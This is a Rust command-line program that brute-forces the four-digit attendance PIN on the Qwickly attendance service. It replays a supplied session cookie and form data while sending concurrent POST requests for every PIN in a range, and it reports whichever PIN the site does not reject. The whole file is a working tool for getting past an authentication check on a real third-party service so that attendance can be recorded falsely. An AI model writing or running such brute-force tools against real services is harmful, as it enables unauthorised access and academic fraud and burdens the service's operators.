use clap::Parser;
use futures::future;
use reqwest::Client;
use std::error::Error;

// const BASE_QWICKLY: &str = "https://www.qwickly.tools/attendance/takerecord";
const ORIGIN_QWICKLY: &str = "https://www.qwickly.tools";

struct TryPinResult {
    valid: bool,
    pin: String,
}

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    #[clap(long)]
    referer: String,
    #[clap(long)]
    user_agent: String,
    #[clap(long)]
    cookie: String,
    #[clap(long)]
    data_no_pin: String,
    #[clap(long)]
    start: u32,
    #[clap(long)]
    end: u32,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();
    let pins = create_4_digit_pins(args.start, args.end)?;
    let try_pin_futures: Vec<_> = pins
        .into_iter()
        .map(move |pin| {
            try_pin(
                args.referer.clone(),
                args.user_agent.clone(),
                args.cookie.clone(),
                args.data_no_pin.clone(),
                pin,
            )
        })
        .collect();
    let results: Vec<_> = future::join_all(try_pin_futures)
        .await
        .into_iter()
        .filter_map(|result| result.ok())
        .collect();
    for result in results {
        if result.valid {
            println!("Successfully cracked pin: {}", result.pin);
            return Ok(());
        }
    }
    println!("Failed to crack pin");
    Ok(())
}

fn create_4_digit_pins(start: u32, end: u32) -> Result<Vec<String>, Box<dyn Error>> {
    let mut pins: Vec<String> = vec![];
    for i in start..end {
        let pin = format!("{:0>4}", i.to_string());
        pins.push(pin.to_string());
    }
    Ok(pins)
}

async fn try_pin(
    referer: String,
    user_agent: String,
    cookie: String,
    data_no_pin: String,
    pin: String,
) -> Result<TryPinResult, Box<dyn Error>> {
    println!("Request initiated for pin: {}", pin);
    let client = Client::new();
    let replaced_pin = data_no_pin.replace("{pin}", &pin);
    let resp = client
        .post(&referer)
        .header("Referer", &referer)
        .header("User-Agent", user_agent)
        .header(
            "Accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        )
        .header("Accept-Encoding", "gzip, deflate, br")
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Connection", "keep-alive")
        .header("Origin", ORIGIN_QWICKLY)
        .header("Cookie", cookie)
        .body(replaced_pin)
        .send()
        .await?;
    println!("Requested for pin: {}", pin);
    if resp.status() != 200 {
        return Err("Not 200 code".into());
    }

    let body = resp.text().await?;
    if body.contains("Incorrect") {
        println!("Pin {} is incorrect", pin);
    } else {
        println!(
            "Incorrect not found for pin(found already, error page or correct pin): {}",
            pin
        );
        return Ok(TryPinResult {
            valid: true,
            pin: pin.to_string(),
        });
    }
    Ok(TryPinResult {
        valid: false,
        pin: pin.to_string(),
    })
}
